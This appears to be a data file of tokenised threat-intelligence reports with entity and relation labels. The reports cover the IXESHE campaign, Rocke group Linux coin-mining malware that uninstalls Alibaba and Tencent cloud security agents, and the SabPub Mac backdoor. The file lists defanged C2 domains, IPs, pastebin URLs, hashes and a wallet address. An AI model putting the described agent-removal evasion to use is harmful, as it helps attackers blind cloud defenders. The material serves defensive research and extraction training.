"characteristics"], ["highlighted", "in", "this", "APT", "campaign", "quick", "profile", "reflect", "the", "results", "of", "our", "investigation", "as", "of", "May", "2012", "."], ["PAGE", "19", "|", "IXESHE"], ["\u00a92012", "by", "Trend", "Micro", ",", "Incorporated", ".", "All", "rights", "reserved", ".", "Trend", "Micro", "and", "the", "Trend", "Micro", "t-ball", "logo", "are", "trademarks", "or", "registered", "trademarks", "of", "Trend", "Micro", ",", "Incorporated", ".", "All", "other", "product", "or", "company"], ["names", "may", "be", "trademarks", "or", "registered", "trademarks", "of", "their", "owners", "."], ["TREND", "MICRO\u2122"], ["Trend", "Micro", "Incorporated", "(TYO:", "4704;", "TSE:", "4704)", ",", "a", "global", "cloud", "security"], ["leader", ",", "creates", "a", "world", "safe", "for", "exchanging", "digital", "information", "with", "its", "Internet", "content", "security", "and", "threat", "management", "solutions", "for", "businesses"], ["and", "consumers", ".", "A", "pioneer", "in", "server", "security", "with", "over"], ["20", "years\u2019", "experience", ",", "we", "deliver", "top-ranked", "client", ",", "server", "and", "cloudbased", "security", "that", "fits", "our", "customers\u2019", "and", "partners\u2019", "needs", ",", "stops"], ["new", "threats", "faster", ",", "and", "protects", "data", "in", "physical", ",", "virtualized", "and", "cloud"], ["environments", ".", "Powered", "by", "the", "industry-leading", "Trend", "Micro\u2122", "Smart", "Protection", "Network\u2122", "cloud", "computing", "security", "infrastructure", ",", "our", "products"], ["and", "services", "stop", "threats", "where", "they", "emerge\u2014from", "the", "Internet", ".", "They", "are"], ["supported", "by", "1", ",", "000+", "threat", "intelligence", "experts", "around", "the", "globe", "."], ["TREND", "MICRO", "INC", "."], ["10101", "N", ".", "De", "Anza", "Blvd", "."], ["Cupertino", ",", "CA", "95014"], ["U", ".", "S.", "toll", "free:", "1", "+800", ".", "228.5651"], ["Phone:", "1", "+408", ".", "257.1500"], ["Fax:", "1", "+408", ".", "257.2003"], ["www", ".", "trendmicro.com"]]}], [{"vertexSet": [{"old_id": "T1", "type": "AttackerGroup", "name": "Iron cybercrime", "sent_id": 6, "pos": [13, 14]}, {"old_id": "T2", "type": "Malware", "name": "Xbash", "sent_id": 7, "pos": [1]}, {"old_id": "T3", "type": "Organization", "name": "Palo Alto Networks", "sent_id": 5, "pos": [0, 2]}, {"old_id": "T4", "type": "Action", "name": "coin mining", "sent_id": 5, "pos": [14, 15]}, {"old_id": "T5", "type": "System", "name": "Linux", "sent_id": 5, "pos": [13]}, {"old_id": "T6", "type": "Organization", "name": "Talos", "sent_id": 7, "pos": [19]}, {"old_id": "T7", "type": "AttackerGroup", "name": "Rocke", "sent_id": 7, "pos": [14]}, {"old_id": "T8", "type": "Attacker", "name": "Rocke group", "sent_id": 11, "pos": [12, 13]}, {"old_id": "T9", "type": "ModificationAction", "name": "uninstall", "sent_id": 11, "pos": [18]}, {"old_id": "T10", "type": "ExploitTargetObject", "name": "cloud security protection", "sent_id": 12, "pos": [1, 3]}, {"old_id": "T11", "type": "ExploitTargetObject", "name": "full administrative contro", "sent_id": 13, "pos": []}, {"old_id": "T12", "type": "Organization", "name": "Tencent Cloud", "sent_id": 16, "pos": [5, 6]}, {"old_id": "T13", "type": "Organization", "name": "Alibaba Cloud", "sent_id": 16, "pos": [8, 6]}, {"old_id": "T14", "type": "Location", "name": "China", "sent_id": 16, "pos": [18]}, {"old_id": "T15", "type": "Exploit", "name": "Coin Miner", "sent_id": 21, "pos": [1, 2]}, {"old_id": "T16", "type": "AttackerGroup", "name": "Rocke Group", "sent_id": 21, "pos": [5, 6]}, {"old_id": "T17", "type": "Organization", "name": "Cisco Talos", "sent_id": 22, "pos": [8, 9]}, {"old_id": "T18", "type": "Attacker", "name": "Rocke", "sent_id": 22, "pos": [3]}, {"old_id": "T19", "type": "ExploitTargetObject", "name": "Monero cryptocurrency", "sent_id": 23, "pos": [0, 1]}, {"old_id": "T20", "type": "Vulnerability", "name": "CVE-2017-10271", "sent_id": 25, "pos": [14]}, {"old_id": "T21", "type": "Software", "name": "Oracle WebLogic", "sent_id": 25, "pos": [11, 0]}, {"old_id": "T22", "type": "File", "name": "0720bin", "sent_id": 26, "pos": []}, {"old_id": "T23", "type": "Host", "name": "Linux", "sent_id": 25, "pos": [16]}, {"old_id": "T24", "type": "AttackerGroup", "name": "Rocke group", "sent_id": 24, "pos": [10, 11]}, {"old_id": "T25", "type": "Software", "name": "Apache Struts 2", "sent_id": 24, "pos": [15, 17]}, {"old_id": "T26", "type": "Software", "name": "WebLogic", "sent_id": 25, "pos": [0]}, {"old_id": "T27", "type": "Software", "name": "Adobe ColdFusion", "sent_id": 25, "pos": [3, 4]}, {"old_id": "T28", "type": "AttackerGroup", "name": "Rocke group", "sent_id": 56, "pos": [0, 1]}, {"old_id": "T29", "type": "Action", "name": "uninstalls cloud security products", "sent_id": 57, "pos": [5, 8]}, {"old_id": "T30", "type": "Organization", "name": "Alibaba Cloud", "sent_id": 57, "pos": [10, 11]}, {"old_id": "T31", "type": "Organization", "name": "Tencent Cloud", "sent_id": 57, "pos": [13, 11]}, {"old_id": "T32", "type": "ExploitTargetObject", "name": "Tencent Cloud Monitor", "sent_id": 58, "pos": [16, 18]}, {"old_id": "T33", "type": "Attacker", "name": "Rocke", "sent_id": 58, "pos": [9]}, {"old_id": "T34", "type": "ExploitTargetObject", "name": "Tencent Cloud Monitor process", "sent_id": 60, "pos": [5, 8]}, {"old_id": "T35", "type": "Organization", "name": "Alibaba Cloud", "sent_id": 63, "pos": [4, 2]}, {"old_id": "T36", "type": "Organization", "name": "Tencent Cloud", "sent_id": 63, "pos": [1, 2]}, {"old_id": "T37", "type": "ExploitTargetObject", "name": "Alibaba Threat Detection Service", "sent_id": 64, "pos": [8, 11]}, {"old_id": "T38", "type": "Software", "name": "Tencent Cloud Host Security", "sent_id": 68, "pos": [7, 10]}, {"old_id": "T39", "type": "Attacker", "name": "Rocke group", "sent_id": 69, "pos": [5, 6]}, {"old_id": "T40", "type": "Organization", "name": "Alibaba Cloud", "sent_id": 69, "pos": [13, 14]}, {"old_id": "T41", "type": "Organization", "name": "Tencent", "sent_id": 69, "pos": [16]}, {"old_id": "T42", "type": "Software", "name": "Alibaba Threat Detection Service", "sent_id": 73, "pos": [2, 5]}, {"old_id": "T43", "type": "Software", "name": "Alibaba CloudMonitor agent", "sent_id": 74, "pos": [2, 4]}, {"old_id": "T44", "type": "Software", "name": "Alibaba Cloud Assistant agent", "sent_id": 75, "pos": [2, 5]}, {"old_id": "T45", "type": "Software", "name": "Tencent Host Security agent", "sent_id": 77, "pos": [2, 5]}, {"old_id": "T46", "type": "Software", "name": "Tencent Cloud Monitor agent", "sent_id": 78, "pos": [2, 5]}, {"old_id": "T47", "type": "Attacker", "name": "Rocke group", "sent_id": 79, "pos": [15, 16]}, {"old_id": "T48", "type": "ExploitTargetObject", "name": "public cloud infrastructure", "sent_id": 81, "pos": [0, 2]}, {"old_id": "T49", "type": "Organization", "name": "Palo Alto Networks", "sent_id": 83, "pos": [0, 2]}, {"old_id": "T50", "type": "Organization", "name": "Tencent Cloud", "sent_id": 83, "pos": [9, 10]}, {"old_id": "T51", "type": "Organization", "name": "Alibaba Cloud", "sent_id": 83, "pos": [12, 10]}, {"old_id": "T52", "type": "ExploitTargetObject", "name": "Public cloud infrastructure", "sent_id": 87, "pos": [0, 2]}, {"old_id": "T53", "type": "Attacker", "name": "Rocke group", "sent_id": 90, "pos": [8, 9]}, {"old_id": "T54", "type": "ExploitTargetObject", "name": "public cloud infrastructure", "sent_id": 91, "pos": [12, 14]}], "labels": [{"old_id": "R1", "r": "P3", "h": 1, "t": 0, "evidence": []}, {"old_id": "R2", "r": "P3", "h": 1, "t": 6, "evidence": [7]}, {"old_id": "R3", "r": "P27", "h": 7, "t": 9, "evidence": [11, 12]}, {"old_id": "R4", "r": "P27", "h": 7, "t": 10, "evidence": [11, 12, 13]}, {"old_id": "R5", "r": "P27", "h": 17, "t": 18, "evidence": [22, 23]}, {"old_id": "R6", "r": "P19", "h": 20, "t": 19, "evidence": [25]}, {"old_id": "R7", "r": "P25", "h": 22, "t": 20, "evidence": [25]}, {"old_id": "R8", "r": "P27", "h": 32, "t": 31, "evidence": [58]}, {"old_id": "R9", "r": "P27", "h": 32, "t": 33, "evidence": [58, 59, 60]}, {"old_id": "R10", "r": "P27", "h": 38, "t": 36, "evidence": []}, {"old_id": "R11", "r": "P17", "h": 40, "t": 37, "evidence": []}, {"old_id": "R12", "r": "P17", "h": 35, "t": 37, "evidence": [63, 64, 65, 66, 67, 68]}, {"old_id": "R13", "r": "P17", "h": 39, "t": 41, "evidence": [69, 70, 71, 72, 73]}, {"old_id": "R14", "r": "P17", "h": 39, "t": 42, "evidence": [69, 70, 71, 72, 73, 74]}, {"old_id": "R15", "r": "P17", "h": 39, "t": 43, "evidence": [69, 70, 71, 72, 73, 74, 75]}, {"old_id": "R16", "r": "P17", "h": 40, "t": 44, "evidence": [69, 70, 71, 72, 73, 74, 75, 76, 77]}, {"old_id": "R17", "r": "P17", "h": 40, "t": 45, "evidence": [69, 70, 71, 72, 73, 74, 75, 76, 77, 78]}, {"old_id": "R18", "r": "P27", "h": 46, "t": 47, "evidence": [79, 80, 81]}, {"old_id": "R19", "r": "P27", "h": 46, "t": 51, "evidence": [79, 80, 81, 82, 83, 84, 85, 86, 87]}, {"old_id": "R20", "r": "P27", "h": 52, "t": 53, "evidence": [90, 91]}, {"old_id": "R21", "r": "P17", "h": 49, "t": 45, "evidence": []}], "title": ["inputs/txt/201901RockeGroupXbash"], "sents": [["Malware", "Used", "by", "\u201cRocke\u201d", "Group", "Evolves", "to", "Evade", "Detection", "by", "Cloud"], ["Security", "Products"], ["unit42", ".", "paloaltonetworks.com/malware-used-by-rocke-group-evolves-to-evade-detection-by-cloud-security-products/"], ["By", "Xingyu", "Jin", "and", "Claud", "Xiao"], ["January", "17", ",", "2019"], ["Palo", "Alto", "Networks", "Unit", "42", "recently", "captured", "and", "investigated", "new", "samples", "of", "the", "Linux", "coin", "mining", "malware", "used", "by"], ["the", "Rocke", "group", ".", "The", "family", "was", "suspected", "to", "be", "developed", "by", "the", "Iron", "cybercrime", "group", "and", "it\u2019s", "also", "associated", "with"], ["the", "Xbash", "malware", "we", "reported", "on", "in", "September", "of", "2018", ".", "The", "threat", "actor", "Rocke", "was", "originally", "revealed", "by", "Talos", "in"], ["August", "of", "2018", "and", "many", "remarkable", "behaviors", "were", "disclosed", "in", "their", "blog", "post", ".", "The", "samples", "described", "in", "this", "report"], ["were", "collected", "in", "October", "of", "2018", ",", "and", "since", "that", "time", "the", "command", "and", "control", "servers", "they", "use", "have", "been", "shut"], ["down", "."], ["During", "our", "analysis", ",", "we", "realized", "that", "these", "samples", "used", "by", "the", "Rocke", "group", "adopted", "new", "code", "to", "uninstall", "five"], ["different", "cloud", "security", "protection", "and", "monitoring", "products", "from", "compromised", "Linux", "servers", ".", "In", "our", "analysis", ",", "these"], ["attacks", "did", "not", "compromise", "these", "security", "products:", "rather", ",", "the", "attacks", "first", "gained", "full", "administrative", "control", "over", "the"], ["hosts", "and", "then", "abused", "that", "full", "administrative", "control", "to", "uninstall", "these", "products", "in", "the", "same", "way", "a", "legitimate"], ["administrator", "would", "."], ["These", "products", "were", "developed", "by", "Tencent", "Cloud", "and", "Alibaba", "Cloud", "(Aliyun)", ",", "the", "two", "leading", "cloud", "providers", "in", "China"], ["that", "are", "expanding", "their", "business", "globally", ".", "To", "the", "best", "of", "our", "knowledge", ",", "this", "is", "the", "first", "malware", "family", "that", "developed"], ["the", "unique", "capability", "to", "target", "and", "remove", "cloud", "security", "products", ".", "This", "also", "highlights", "a", "new", "challenge", "for", "products"], ["in", "the", "Cloud", "Workload", "Protection", "Platforms", "market", "defined", "by", "Gartner", "."], ["Technical", "Details"], ["The", "Coin", "Miner", "used", "by", "Rocke", "Group"], ["The", "threat", "actor", "Rocke", "was", "first", "reported", "by", "Cisco", "Talos", "in", "late", "July", "2018", ".", "The", "ultimate", "goal", "of", "this", "threat", "is", "to", "mine"], ["Monero", "cryptocurrency", "in", "compromised", "Linux", "machines", "."], ["To", "deliver", "the", "malware", "to", "the", "victim", "machines", ",", "the", "Rocke", "group", "exploits", "vulnerabilities", "in", "Apache", "Struts", "2", ",", "Oracle"], ["WebLogic", ",", "and", "Adobe", "ColdFusion", ".", "For", "example", ",", "by", "exploiting", "Oracle", "WebLogic", "vulnerability", "CVE-2017-10271", "in", "Linux"], ["shown", "in", "Figure", "1", ",", "a", "compromised", "Linux", "victim", "machine", "downloads", "backdoor", "0720", ".", "bin", "and", "opens", "a", "shell", "."], ["Figure", "1", ".", "Exploit", "CVE-2017-10271"], ["Once", "the", "C2", "connection", "is", "established", ",", "malware", "used", "by", "the", "Rocke", "group", "downloads", "shell", "script", "named", "as", "\u201ca7\u201d", "to", "the"], ["victim", "machine", ".", "The", "behaviors", "of", "a7", "include:"], ["Achieve", "persistence", "through", "cronjobs"], ["Kill", "other", "crypto", "mining", "processes"], ["1/6"], ["Add", "iptables", "rules", "to", "block", "other", "crypto", "mining", "malware"], ["Uninstall", "agent-based", "cloud", "security", "products"], ["Download", "and", "run", "UPX", "packed", "coin", "miner", "from", "blog[", ".", "]sydwzl[.]cn"], ["Hide", "process", "from", "Linux", "ps", "command", "by", "using", "the", "open", "source", "tool", "\u201clibprocesshider\u201d", "with", "LD_PRELOAD", "trick"], ["Adjust", "malicious", "file", "date", "time"], ["Cloud", "Workload", "Protection", "Platforms"], ["According", "to", "Gartner", ",", "Cloud", "Workload", "Protection", "Platforms", "(CWPPs)", "are", "the", "agent-based", "workload-centric", "security"], ["protection", "solutions", ".", "To", "mitigate", "the", "impact", "of", "malware", "intrusion", "in", "public", "cloud", "infrastructure", ",", "cloud", "service", "providers"], ["develop", "their", "own", "CWPPs", "as", "the", "server", "security", "operation", "and", "management", "products", "."], ["For", "example", ",", "Tencent", "Cloud", "offers", "Tencent", "Host", "Security", "(HS", ",", "aka", "YunJing\u4e91\u955c)", "with", "various", "security", "protection"], ["services", ".", "According", "to", "its", "\u201cProduct", "Overview\u201d", "document", ",", "Tencent", "Host", "Security", "provides", "key", "security", "features", "like"], ["trojan", "detection", "and", "removal", "based", "on", "machine", "learning", ",", "password", "cracking", "alert", ",", "logging", "activity", "audit", ",", "vulnerability"], ["management", ",", "and", "asset", "management", "as", "shown", "in", "Figure", "2", "."], ["Figure", "2", ".", "Tencent", "Host", "Security", "Key", "Features"], ["Alibaba", "Cloud", "(Aliyun)", "also", "offers", "a", "cloud", "security", "product", "called", "Threat", "Detection", "Service", "(TDS", ",", "aka", "Aegis", "\u5b89\u9a91\u58eb)", "."], ["Alibaba", "Cloud", "Threat", "Detection", "Service", "provides", "security", "services", "like", "malware", "scanning", "and", "removal", ",", "vulnerability"], ["management", ",", "log", "analysis", ",", "and", "threat", "analysis", "based", "on", "big", "data", "."], ["Third-party", "cybersecurity", "companies", "also", "provide", "CWPPs", ".", "For", "instance", ",", "Trend", "Micro", ",", "Symantec", ",", "and", "Microsoft", "have"], ["their", "own", "cloud", "security", "products", "for", "public", "cloud", "infrastructure", ".", "As", "with", "all", "security", "products", ",", "adversaries", "inevitably"], ["work", "to", "evade", "these", "systems", "to", "be", "able", "to", "achieve", "their", "ultimate", "goals", "."], ["Evading", "Detection", "from", "Cloud", "Workload", "Protection", "Platforms"], ["2/6"], ["In", "response", "to", "agent-based", "Cloud", "Workload", "Protection", "Platforms", "from", "cloud", "service", "providers", ",", "malware", "used", "by", "the"], ["Rocke", "group", "gradually", "developed", "the", "capability", "to", "evade", "detection", "before", "exhibiting", "any", "malicious", "behaviors", ".", "To", "be"], ["more", "specific", ",", "the", "malware", "uninstalls", "cloud", "security", "products", "by", "Alibaba", "Cloud", "and", "Tencent", "Cloud", "."], ["In", "the", "early", "version", "of", "the", "malware", "used", "by", "Rocke", ",", "it", "only", "attempts", "to", "kill", "Tencent", "Cloud", "Monitor", "process", "as", "shown", "in"], ["Figure", "3", "."], ["Figure", "3", ".", "Malware", "kills", "Tencent", "Cloud", "Monitor", "process"], ["Realizing", "that", "killing", "the", "cloud", "monitor", "service", "alone", "is", "not", "enough", "to", "evade", "detection", "by", "agent-based", "cloud", "security"], ["products", ",", "the", "malware", "authors", "continued", "developing", "more", "effective", "methods", "to", "evade", "detection", "by", "killing", "more", "agentbased", "cloud", "security", "services", "."], ["The", "Tencent", "Cloud", "and", "Alibaba", "Cloud", "official", "websites", "provide", "documents", "to", "guide", "users", "about", "how", "to", "uninstall", "their"], ["cloud", "security", "products", ".", "The", "document", "for", "uninstalling", "Alibaba", "Threat", "Detection", "Service", "is", "shown", "in", "Figure", "4", "."], ["Figure", "4", ".", "Official", "guide", "for", "uninstalling", "Alibaba", "Threat", "Detection", "Service"], ["The", "document", "for", "uninstalling", "Tencent", "Cloud", "Host", "Security", "is", "shown", "in", "Figure", "5", "."], ["3/6"], ["Figure", "5", ".", "Official", "guide", "for", "uninstalling", "Tencent", "Cloud", "Host", "Security", "Product"], ["The", "malware", "used", "by", "the", "Rocke", "group", "follows", "the", "uninstallation", "procedure", "provided", "by", "Alibaba", "Cloud", "and", "Tencent"], ["Cloud", "as", "well", "as", "some", "random", "blog", "posts", "on", "the", "Internet", ".", "The", "key", "uninstall", "function", "is", "shown", "in", "Figure", "6", "."], ["Figure", "6", ".", "Key", "function", "for", "malware", "to", "evade", "detection"], ["This", "function", "can", "uninstall:"], ["1", ".", "Alibaba", "Threat", "Detection", "Service", "agent", "."], ["2", ".", "Alibaba", "CloudMonitor", "agent", "(Monitor", "CPU", "&", "memory", "consumption", ",", "network", "connectivity)", "."], ["3", ".", "Alibaba", "Cloud", "Assistant", "agent", "(tool", "for", "automatically", "managing", "instances)", "."], ["4/6"], ["4", ".", "Tencent", "Host", "Security", "agent", "."], ["5", ".", "Tencent", "Cloud", "Monitor", "agent", "."], ["After", "agent-based", "cloud", "security", "and", "monitor", "products", "are", "uninstalled", ",", "the", "malware", "used", "by", "the", "Rocke", "group", "begins", "to"], ["exhibit", "malicious", "behaviors", ".", "We", "believe", "this", "unique", "evasion", "behavior", "will", "be", "the", "new", "trend", "for", "malware", "which", "targets"], ["public", "cloud", "infrastructure", "."], ["Mitigations"], ["Palo", "Alto", "Networks", "Unit", "42", "has", "been", "cooperating", "with", "Tencent", "Cloud", "and", "Alibaba", "Cloud", "to", "address", "the", "malware"], ["evasion", "problem", "and", "its", "C2", "infrastructure", ".", "Additionally", ",", "the", "malicious", "C2", "domains", "are", "identified", "by", "our", "PAN-DB", "URL"], ["Filtering", "."], ["Conclusion"], ["Public", "cloud", "infrastructure", "is", "one", "of", "the", "main", "targets", "for", "this", "cybercrime", "group", ".", "Realizing", "the", "existing", "cloud", "monitor"], ["and", "security", "products", "may", "detect", "the", "possible", "malware", "intrusion", ",", "malware", "authors", "continue", "to", "create", "new", "evasion"], ["technologies", "to", "avoid", "being", "detected", "by", "cloud", "security", "product", "."], ["The", "variant", "of", "the", "malware", "used", "by", "the", "Rocke", "group", "is", "an", "example", "that", "demonstrates", "that", "the", "agent-based", "cloud"], ["security", "solution", "may", "not", "be", "enough", "to", "prevent", "evasive", "malware", "targeted", "at", "public", "cloud", "infrastructure", "."], ["Indicators", "of", "Compromise"], ["Samples", "with", "the", "evasion", "behavior"], ["2e3e8f980fde5757248e1c72ab8857eb2aea9ef4a37517261a1b013e3dc9e3c4"], ["2f603054dda69c2ac1e49c916ea4a4b1ae6961ec3c01d65f16929d445a564355"], ["28ea5d2e44538cd7fec11a28cce7c86fe208b2e8f53d57bf8a18957adb90c5ab"], ["232c771f38da79d5b8f7c6c57ddb4f7a8d6d44f8bca41be4407ed4923096c700"], ["893bdc6b7d2d7134b1ceb5445dbb97ad9c731a427490d59f6858a835525d8417"], ["9300f1aa56a73887d05672bfb9862bd786230142c949732c208e5e019d14f83a"], ["27611b92d31289d023d962d3eb7c6abd194dbdbbe4e6977c42d94883553841e8"], ["d341e3a9133e534ca35d5ccc54b8a79f93ff0c917790e7d5f73fedaa480a6b93"], ["ed038e9ea922af9f0bf5e8be42b394650fa808982d5d555e6c50c715ff2cca0c"], ["4b74c4d66387c70658238ac5ab392e2fe5557f98fe09eadda9259ada0d87c0f1"], ["e391963f496ba056e9a9f750cbd28ca7a08ac4cfc434bee4fc57a292b11941e6"], ["017dee32e287f37a82cf6e249f8a85b5c9d4f090e5452118ccacaf147e88dc66"], ["Domains", "for", "C2", "Communication"], ["dwn[", ".", "]rundll32[.]ml"], ["www[", ".", "]aybc[.]so"], ["a[", ".", "]ssvs[.]space"], ["sydwzl[", ".", "]cn"], ["IPs", "for", "C2", "Communication"], ["118", ".", "24.150[.]172", "(on", "Tencent", "Cloud)"], ["120", ".", "55.54[.]65", "(on", "Alibaba", "Cloud)"], ["URLs", "for", "Code", "Update"], ["5/6"], ["hxxps://pastebin[", ".", "]com/raw/CnPtQ2tM"], ["hxxps://pastebin[", ".", "]com/raw/rjPGgXQE"], ["hxxps://pastebin[", ".", "]com/raw/1NtRkBc3"], ["hxxps://pastebin[", ".", "]com/raw/tRxfvbYN"], ["hxxps://pastebin[", ".", "]com/raw/SSCy7mY7"], ["hxxps://pastebin[", ".", "]com/raw/VVt27LeH"], ["hxxps://pastebin[", ".", "]com/raw/Fj2YdETv"], ["hxxps://pastebin[", ".", "]com/raw/JNPewK6r"], ["hxxps://pastebin[", ".", "]com/raw/TzBeq3AM"], ["hxxps://pastebin[", ".", "]com/raw/eRkrSQfE"], ["hxxps://pastebin[", ".", "]com/raw/5bjpjvLP"], ["hxxps://pastebin[", ".", "]com/raw/Gw7mywhC"], ["XMR", "Wallet", "Address"], ["42im1KxfTw2Sxa716eKkQAcJpS6cwqkGaHHGnnUAcdDhG2NJhqEF1nNRwjkBsYDJQtDkLCTPehfDC4zjMy5hefT81Xk2h7V", ".", "v7"], ["6/6"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Attacker", "name": "LuckyCat", "sent_id": 2, "pos": [3]}, {"old_id": "T2", "type": "Address", "name": "199192152*", "sent_id": 2, "pos": []}, {"old_id": "T3", "type": "Time", "name": "Friday Apri 13", "sent_id": 8, "pos": [1, 3]}, {"old_id": "T4", "type": "Malware", "name": "SabPub", "sent_id": 18, "pos": [4]}, {"old_id": "T5", "type": "Indicator", "name": "e3SCNUA2Om97ZXJ1fGI+Y4Bt", "sent_id": 24, "pos": []}, {"old_id": "T6", "type": "Indicator", "name": "OjlDLjw5Pi4+NUAuQDBA", "sent_id": 25, "pos": []}, {"old_id": "T7", "type": "Malware", "name": "SabPub", "sent_id": 22, "pos": [2]}, {"old_id": "T8", "type": "Dropper", "name": "ExploitMSWordCVE-2009-0563a", "sent_id": 29, "pos": []}, {"old_id": "T9", "type": "Malware", "name": "MaControl", "sent_id": 30, "pos": [14]}, {"old_id": "T10", "type": "File", "name": "8958doc", "sent_id": 33, "pos": []}, {"old_id": "T11", "type": "MD5", "name": "40C8786A4887A763D8F3E5243724D1C9", "sent_id": 35, "pos": []}, {"old_id": "T12", "type": "File", "name": "10th March Statemnet", "sent_id": 37, "pos": []}, {"old_id": "T13", "type": "Malware", "name": "SabPub", "sent_id": 31, "pos": [1]}, {"old_id": "T14", "type": "Software", "name": "VirusTotal", "sent_id": 39, "pos": [4]}, {"old_id": "T15", "type": "Exploit", "name": "spearphishing emails", "sent_id": 48, "pos": [17, 18]}, {"old_id": "T16", "type": "Exploit", "name": "Java exploits", "sent_id": 52, "pos": [14, 15]}, {"old_id": "T17", "type": "ExploitTargetObject", "name": "Mac OS X", "sent_id": 53, "pos": [1, 3]}, {"old_id": "T18", "type": "Time", "name": "February 2012", "sent_id": 58, "pos": [15, 16]}, {"old_id": "T19", "type": "Attacker", "name": "SabPub", "sent_id": 57, "pos": [7]}, {"old_id": "T20", "type": "Vulnerability", "name": "CVE-2009-0563", "sent_id": 59, "pos": [12]}, {"old_id": "T21", "type": "Software", "name": "Word", "sent_id": 59, "pos": [7]}], "labels": [{"old_id": "R1", "r": "P33", "h": 0, "t": 2, "evidence": [2, 3, 4, 5, 6, 7, 8]}, {"old_id": "R2", "r": "P21", "h": 4, "t": 6, "evidence": []}, {"old_id": "R3", "r": "P21", "h": 5, "t": 6, "evidence": []}, {"old_id": "R4", "r": "P21", "h": 9, "t": 12, "evidence": []}, {"old_id": "R5", "r": "P21", "h": 10, "t": 12, "evidence": []}, {"old_id": "R6", "r": "P33", "h": 18, "t": 17, "evidence": [57, 58]}, {"old_id": "R7", "r": "P19", "h": 20, "t": 19, "evidence": [59]}], "title": ["inputs/txt/201204SecureListSabPub"], "sents": [["New", "Version", "of", "OSX", ".", "SabPub", "&", "Confirmed", "Mac", "APT", "attacks"], ["Late", "last", "week", ",", "we", "found", "evidence", "of", "a", "possible", "link", "between", "a", "Mac", "OS", "X", "backdoor", "trojan", "and", "an", "APT"], ["attack", "known", "as", "LuckyCat", ".", "The", "IP", "address", "of", "the", "C&C", "to", "which", "this", "bot", "connects", "(199", ".", "192.152.*)", "was", "also"], ["used", "in", "other", "Windows", "malware", "samples", "during", "2011", ",", "which", "made", "us", "believe", "we", "were", "looking", "at", "the", "same"], ["entity", "behind", "these", "attacks", "."], ["For", "the", "past", "two", "days", ",", "we", "have", "been", "monitoring", "a", "\u201cfake\u201d", "infected", "system", "-", "which", "is", "a", "typical", "procedure", "we"], ["do", "for", "APT", "bots", ".", "We", "were", "extremely", "surprised", "when", "during", "the", "weekend", ",", "the", "APT", "controllers", "took", "over"], ["our", "\u201cgoat\u201d", "infected", "machine", "and", "started", "exploring", "it", "."], ["On", "Friday", "Apri", "13", ",", "port", "80", "on", "the", "C&C", "server", "located", "at", "rt*****", ".", "onedumb.com", "and", "hosted", "on", "a", "VPS", "in"], ["Fremont", ",", "U", ".", "S.", "was", "closed", ".", "Saturday", ",", "the", "port", "was", "opened", "and", "bot", "started", "communicating", "with", "the", "C&C"], ["server", ".", "For", "the", "entire", "day", ",", "the", "traffic", "was", "just", "basic", "handshakes", "and", "exchanges", ",", "nothing", "more", "."], ["On", "the", "morning", "of", "Sunday", "April", "15", ",", "the", "traffic", "generated", "by", "the", "C&C", "changed", ".", "The", "attackers", "took", "over", "the"], ["connection", "and", "started", "analysing", "our", "fake", "victim", "machine", ".", "They", "listed", "the", "contents", "of", "the", "root", "and", "home"], ["folders", "and", "even", "stole", "some", "of", "the", "goat", "documents", "we", "put", "in", "there", "!"], ["Encoded", "communication", "between", "C&C", "and", "our", "fake", "victim"], ["Packet", "above", ",", "decoded", "-", "attacker", "is", "listing", "folders", "content"], ["We", "are", "pretty", "confident", "the", "operation", "of", "the", "bot", "was", "done", "manually", "--", "which", "means", "a", "real", "attacker", ",", "who"], ["manually", "checks", "the", "infected", "machines", "and", "extracts", "data", "from", "them", "."], ["We", "can", "therefore", "confirm", "SabPub", "as", "APT", "in", "active", "stage", "."], ["On", "Sunday", "midday", ",", "the", "C&C", "domain", "was", "shutdown", "and", "the", "bot", "lost", "connection", "to", "it;", "this", "appears", "to", "be", "an"], ["initiative", "from", "the", "free", "DNS", "service", "onedumb", ".", "com", "and", "it", "was", "no", "doubt", "triggered", "by", "the", "media", "attention", "."], ["Interestingly", ",", "the", "VPS", "used", "as", "the", "C&C", "is", "still", "active", "."], ["While", "analysing", "SabPub", ",", "we", "discovered", "another", "version", "of", "the", "backdoor", "which", "seems", "to", "have", "been", "created"], ["earlier", ".", "This", "version", "differs", "from", "the", "original", "one", "only", "slightly", "--", "the", "hardcoded", "C&C", "address", "is", "different", "-instead", "of", "the", "onedumb", ".", "com", "subdomain", "used", "by", "the", "original", "sample", "(hardcoded", "in", "the", "bot", "as"], ["\u201ce3SCNUA2Om97ZXJ1fGI+Y4Bt\u201d)", ",", "this", "one", "simply", "contains", "the", "IP", "address", "of", "the", "VPS", "(hardcoded", "as"], ["\u201cOjlDLjw5Pi4+NUAuQDBA\u201d)", ",", "meaning", ",", "it", "should", "still", "be", "operational", ".", "Its", "size", "is", "42556", "bytes", "vs", "42580"], ["for", "the", "original", "one", "."], ["One", "of", "the", "biggest", "mysteries", "is", "the", "infection", "vector", "of", "these", "attacks", ".", "Given", "the", "highly", "targeted", "nature", "of", "the"], ["attack", ",", "there", "are", "very", "few", "traces", ".", "Nevertheless", ",", "we", "found", "an", "important", "detail", "which", "is", "the", "missing", "link:", "Six"], ["Microsoft", "Word", "documents", ",", "which", "we", "detect", "as", "Exploit", ".", "MSWord.CVE-2009-0563.a.", "In", "total", "we", "have"], ["six", "relevant", "Word", "", ".", "docs", "with", "this", "verdict", "--", "with", "four", "dropping", "the", "MaControl", "bot", ".", "The", "remaining", "two"], ["drop", "SabPub", "."], ["The", "most", "interesting", "thing", "here", "is", "the", "history", "of", "the", "second", "SabPub", "variant", ".", "In", "our", "virus", "collection", ",", "it", "is"], ["named", "\u201c8958", ".", "doc\u201d.", "This", "suggests", "iit", "was", "extracted", "from", "a", "Word", "document", "or", "was", "distributed", "as", "a", "Doc-file", "."], ["We", "performed", "an", "analysis", "of", "the", "same", "and", "traced", "its", "origin", "by", "the", "MD5"], ["(40C8786A4887A763D8F3E5243724D1C9)", ".", "The", "results", "were", "fascinating:"], ["-", "The", "sample", "was", "uploaded", "to", "VirusTotal", "on", "February", "25", ",", "2012", "\u2013", "from", "two", "sources", "in", "the", "U", ".", "S."], ["-", "In", "both", "cases", ",", "the", "original", "file", "name", "was", "\u201c10th", "March", "Statemnet\u201d", "(yes", ",", "with", "the", "typo", "and", "without"], ["extension)"], ["-", "Zero", "detections", "on", "VirusTotal", "at", "that", "time", "(0/40)"], ["In", "case", "you", "are", "wondering", ",", "the", "name", "of", "the", "file", "(\u201c10th", "March", "Statemnet\u201d)", "is", "directly", "linked", "with", "the", "DalaiLama", "and", "Tibetan", "community", ".", 